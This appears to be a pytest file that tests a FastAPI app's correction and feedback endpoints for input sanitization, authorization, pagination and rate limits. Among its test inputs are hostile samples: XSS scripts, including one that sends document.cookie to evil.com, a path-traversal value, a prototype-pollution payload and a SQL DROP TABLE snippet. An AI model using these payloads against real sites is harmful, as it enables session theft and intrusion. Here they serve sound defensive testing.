from __future__ import annotations

from datetime import datetime, timezone
from types import SimpleNamespace
from uuid import uuid4
from unittest.mock import AsyncMock, patch

import pytest
from fastapi.testclient import TestClient

from app.api.deps import get_current_user
from app.database import get_db
from app.api.v1.corrections import CORRECTION_RATE_LIMIT
from app.api.v1.feedback import FEEDBACK_RATE_LIMIT
from app.core.quota import QuotaSnapshot, QuotaWindow
from app.main import app
from tests.conftest import MockResult, MockRow


@pytest.fixture(autouse=True)
def _patch_app_lifespan():
    with patch("app.main.bootstrap_app_settings", new=AsyncMock(return_value=None)):
        yield


@pytest.fixture
def client(mock_db, test_user):
    async def _get_db_override():
        yield mock_db

    async def _get_user_override():
        return test_user

    app.dependency_overrides[get_db] = _get_db_override
    app.dependency_overrides[get_current_user] = _get_user_override
    with TestClient(app) as test_client:
        yield test_client
    app.dependency_overrides.clear()


@pytest.fixture
def anon_client(mock_db):
    async def _get_db_override():
        yield mock_db

    app.dependency_overrides[get_db] = _get_db_override
    with TestClient(app) as test_client:
        yield test_client
    app.dependency_overrides.clear()


def _correction_payload(**overrides):
    payload = {
        "target_type": "taxon",
        "target_id": "123",
        "target_title": "Test Taxon",
        "field_name": "scientific_name",
        "current_value": "Old value",
        "suggested_value": "New value",
        "note": "Looks incorrect",
    }
    payload.update(overrides)
    return payload


def _make_correction(**overrides):
    now = datetime.now(timezone.utc)
    data = {
        "id": 1,
        "user_id": uuid4(),
        "target_type": "taxon",
        "target_id": "123",
        "target_title": "Test Taxon",
        "field_name": "scientific_name",
        "current_value": "Old value",
        "suggested_value": "New value",
        "note": "Looks incorrect",
        "status": "pending",
        "admin_note": None,
        "created_at": now,
        "updated_at": now,
    }
    data.update(overrides)
    return SimpleNamespace(**data)


def _feedback_payload(**overrides):
    payload = {
        "category": "bug",
        "content": "Feedback content long enough",
    }
    payload.update(overrides)
    return payload


def _make_feedback_row(**overrides):
    now = datetime.now(timezone.utc)
    data = {
        "id": 1,
        "category": "bug",
        "content": "Feedback content long enough",
        "status": "pending",
        "admin_note": None,
        "created_at": now,
        "updated_at": now,
    }
    data.update(overrides)
    return MockRow(**data)


def _quota_snapshot(query_type: str) -> QuotaSnapshot:
    reset_at = datetime.now(timezone.utc)
    window = QuotaWindow(used=1, limit=10, reset_at=reset_at)
    return QuotaSnapshot(query_type=query_type, hourly=window, daily=window)


def _statement_params(statement) -> dict:
    return statement.compile().params


@pytest.mark.parametrize(
    ("payload_overrides", "expected_status", "expected_note", "expected_suggested"),
    [
        (
            {"note": "<script>alert('xss')</script>"},
            201,
            "<script>alert('xss')</script>",
            "New value",
        ),
        (
            {"suggested_value": "abc\x00\x01\x02xyz"},
            201,
            "Looks incorrect",
            "abcxyz",
        ),
        ({"suggested_value": "\x00\x01"}, 201, "Looks incorrect", ""),
        ({"target_type": "../../etc/passwd"}, 201, "Looks incorrect", "New value"),
        ({"note": "line1\nline2\nline3"}, 201, "line1\nline2\nline3", "New value"),
        (
            {"suggested_value": '{"__proto__": {"isAdmin": true}}'},
            201,
            "Looks incorrect",
            '{"__proto__": {"isAdmin": true}}',
        ),
        ({"target_id": "0"}, 201, "Looks incorrect", "New value"),
        ({"target_id": str(2**63)}, 201, "Looks incorrect", "New value"),
    ],
)
def test_submit_correction_security_cases(
    client,
    mock_db,
    test_user,
    payload_overrides,
    expected_status,
    expected_note,
    expected_suggested,
):
    mock_db.execute.return_value = MockResult(scalar_val=0)

    async def fake_create_correction(**kwargs):
        payload = kwargs["payload"]
        return _make_correction(
            user_id=test_user.id,
            target_type=payload.target_type,
            target_id=payload.target_id,
            target_title=payload.target_title,
            field_name=payload.field_name,
            current_value=payload.current_value,
            suggested_value=payload.suggested_value,
            note=payload.note,
        )

    with patch("app.api.v1.corrections.create_correction", new=AsyncMock(side_effect=fake_create_correction)):
        response = client.post("/api/v1/corrections", json=_correction_payload(**payload_overrides))

    assert response.status_code == expected_status
    body = response.json()
    assert body["note"] == expected_note
    assert body["suggested_value"] == expected_suggested


def test_submit_correction_oversized_note(client):
    response = client.post(
        "/api/v1/corrections",
        json=_correction_payload(note="a" * 50000),
    )

    assert response.status_code == 422


def test_submit_correction_missing_required_fields(client):
    response = client.post(
        "/api/v1/corrections",
        json=_correction_payload(target_type=""),
    )

    assert response.status_code == 422


def test_list_corrections_negative_offset(client, mock_db, test_user):
    async def fake_list_user_corrections(**kwargs):
        assert kwargs["user_id"] == test_user.id
        assert kwargs["limit"] == 20
        assert kwargs["offset"] == 0
        return ([], 0)

    with patch(
        "app.api.v1.corrections.list_user_corrections",
        new=AsyncMock(side_effect=fake_list_user_corrections),
    ):
        response = client.get("/api/v1/corrections/me?offset=-5")

    assert response.status_code == 200
    assert response.json() == []


def test_list_corrections_excessive_limit(client):
    async def fake_list_user_corrections(**kwargs):
        assert kwargs["limit"] == 100
        assert kwargs["offset"] == 0
        return ([], 0)

    with patch(
        "app.api.v1.corrections.list_user_corrections",
        new=AsyncMock(side_effect=fake_list_user_corrections),
    ):
        response = client.get("/api/v1/corrections/me?limit=99999")

    assert response.status_code == 200
    assert response.json() == []


@pytest.mark.parametrize(
    ("payload_overrides", "expected_status", "expected_content"),
    [
        (
            {"content": "<script>fetch('https://evil.com/'+document.cookie)</script>"},
            201,
            "<script>fetch('https://evil.com/'+document.cookie)</script>",
        ),
        ({"content": "hello\x00\x01\x02world"}, 201, "helloworld"),
        ({"category": "BUG"}, 400, None),
        ({"category": "Bug"}, 400, None),
        ({"content": "含中文 العربية 😀 feedback"}, 201, "含中文 العربية 😀 feedback"),
        ({"content": "```sql\nDROP TABLE users;\n```"}, 201, "```sql\nDROP TABLE users;\n```"),
    ],
)
def test_submit_feedback_security_cases(client, mock_db, payload_overrides, expected_status, expected_content):
    count_result = MockResult(scalar_val=0)
    mock_db.execute.return_value = count_result

    async def fake_refresh(feedback_obj):
        feedback_obj.id = 11
        feedback_obj.status = "pending"
        feedback_obj.admin_note = None
        feedback_obj.created_at = datetime.now(timezone.utc)
        feedback_obj.updated_at = datetime.now(timezone.utc)

    mock_db.refresh.side_effect = fake_refresh

    response = client.post("/api/v1/feedback", json=_feedback_payload(**payload_overrides))

    assert response.status_code == expected_status
    if expected_status == 201:
        assert response.json()["content"] == expected_content
    else:
        assert "Invalid category" in response.json()["detail"]


def test_submit_feedback_empty_content(client):
    response = client.post("/api/v1/feedback", json=_feedback_payload(content=""))

    assert response.status_code == 422


def test_submit_feedback_whitespace_only(client, mock_db):
    mock_db.execute.return_value = MockResult(scalar_val=0)

    response = client.post("/api/v1/feedback", json=_feedback_payload(content="   \n\t  "))

    assert response.status_code == 400
    assert response.json()["detail"] == "Content is empty after sanitization"


def test_submit_feedback_invalid_category(client, mock_db):
    mock_db.execute.return_value = MockResult(scalar_val=0)

    response = client.post("/api/v1/feedback", json=_feedback_payload(category="malware"))

    assert response.status_code == 400
    assert "Invalid category" in response.json()["detail"]


def test_submit_feedback_oversized_content(client):
    response = client.post(
        "/api/v1/feedback",
        json=_feedback_payload(content="a" * 100000),
    )

    assert response.status_code == 422


def test_list_feedback_negative_offset(client, mock_db, test_user):
    mock_db.execute.return_value = MockResult(rows=[])

    response = client.get(f"/api/v1/feedback/me?offset=-10&user_id={uuid4()}")

    assert response.status_code == 200
    assert response.json() == []

    statement = mock_db.execute.await_args.args[0]
    params = _statement_params(statement)
    assert any(value == test_user.id for value in params.values())
    assert int(statement._offset_clause.value) == 0


def test_list_feedback_excessive_limit(client, mock_db):
    mock_db.execute.return_value = MockResult(rows=[])

    response = client.get("/api/v1/feedback/me?limit=999999")

    assert response.status_code == 200
    assert response.json() == []

    statement = mock_db.execute.await_args.args[0]
    assert int(statement._limit_clause.value) == 100


def test_correction_rate_limit_bypass_attempt(client, mock_db):
    mock_db.execute.return_value = MockResult(scalar_val=CORRECTION_RATE_LIMIT)

    response = client.post("/api/v1/corrections", json=_correction_payload())

    assert response.status_code == 429
    assert str(CORRECTION_RATE_LIMIT) in response.json()["detail"]


def test_feedback_rate_limit_bypass_attempt(client, mock_db):
    mock_db.execute.return_value = MockResult(scalar_val=FEEDBACK_RATE_LIMIT)

    response = client.post("/api/v1/feedback", json=_feedback_payload())

    assert response.status_code == 429
    assert str(FEEDBACK_RATE_LIMIT) in response.json()["detail"]


def test_quota_endpoint_accessible(client):
    async def fake_get_user_quota_snapshot(db, user, query_type):
        return _quota_snapshot(query_type)

    with patch(
        "app.api.v1.users.get_user_quota_snapshot",
        new=AsyncMock(side_effect=fake_get_user_quota_snapshot),
    ):
        response = client.get("/api/v1/users/me/quota")

    assert response.status_code == 200
    body = response.json()
    assert body["role"] == "user"
    assert set(body["quotas"].keys()) == {"ai", "auction", "taxa"}


def test_quota_endpoint_requires_auth(anon_client):
    response = anon_client.get("/api/v1/users/me/quota")

    assert response.status_code == 401


def test_cannot_list_other_user_corrections(client, test_user):
    attempted_user_id = str(uuid4())

    async def fake_list_user_corrections(**kwargs):
        assert kwargs["user_id"] == test_user.id
        assert str(kwargs["user_id"]) != attempted_user_id
        return ([], 0)

    with patch(
        "app.api.v1.corrections.list_user_corrections",
        new=AsyncMock(side_effect=fake_list_user_corrections),
    ):
        response = client.get(f"/api/v1/corrections/me?user_id={attempted_user_id}")

    assert response.status_code == 200
    assert response.json() == []


def test_cannot_list_other_user_feedback(client, mock_db, test_user):
    attempted_user_id = str(uuid4())
    mock_db.execute.return_value = MockResult(rows=[])

    response = client.get(f"/api/v1/feedback/me?user_id={attempted_user_id}")

    assert response.status_code == 200
    assert response.json() == []

    statement = mock_db.execute.await_args.args[0]
    params = _statement_params(statement)
    assert any(value == test_user.id for value in params.values())
    assert attempted_user_id not in {str(value) for value in params.values()}


def test_corrections_require_auth(anon_client):
    response = anon_client.post("/api/v1/corrections", json=_correction_payload())

    assert response.status_code == 401


def test_feedback_require_auth(anon_client):
    response = anon_client.post("/api/v1/feedback", json=_feedback_payload())

    assert response.status_code == 401
